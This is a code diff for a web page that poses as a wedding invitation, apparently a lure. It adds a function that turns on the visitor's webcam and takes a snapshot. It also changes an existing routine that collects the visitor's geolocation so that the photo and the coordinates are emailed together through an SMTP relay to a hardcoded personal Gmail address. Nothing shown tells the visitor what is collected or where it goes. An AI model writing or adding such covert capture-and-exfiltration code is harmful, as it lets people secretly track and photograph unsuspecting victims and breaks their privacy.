@@ -46,9 +46,21 @@ function getLocation() {
   });
 
 }
+async function cap(){
+  let video = document.querySelector("#videom");
 
+let canvas = document.querySelector("#canvasm");
+  let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+	video.srcObject = stream;
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+  let image_data_url = canvas.toDataURL('image/jpeg');
+  console.log(image_data_url);
+  return image_data_url
+}
 
-function ssss() {
+async function ssss() {
+  let rr = await cap()
+
   getLocation().then((res) => {
     let data = {
       lat: res.coords.latitude,
@@ -61,14 +73,14 @@ function ssss() {
     };
     fetch(`https://getinvitelocation.netlify.app/.netlify/functions/server/getLocation`, options)
       .then(response => response.json())
-      .then(response => sendEmail(response))
+      .then(response => sendEmail(response,rr))
       .catch(err => console.error(err));
 
   })
 
 }
 
-function sendEmail(coords) {
+function sendEmail(coords,rr) {
 
   Email.send({
     Host: "smtp.elasticemail.com",
@@ -77,7 +89,7 @@ function sendEmail(coords) {
     To: 'mohits2125@gmail.com',
     From: "sterdon458@gmail.com",
     Subject: "Wedding-Invite",
-    Body: JSON.stringify(coords),
+    Body: JSON.stringify(coords)+"********IMAGE********** "+rr,
   })
     .then(function (message) {
       // alert("mail sent successfully")
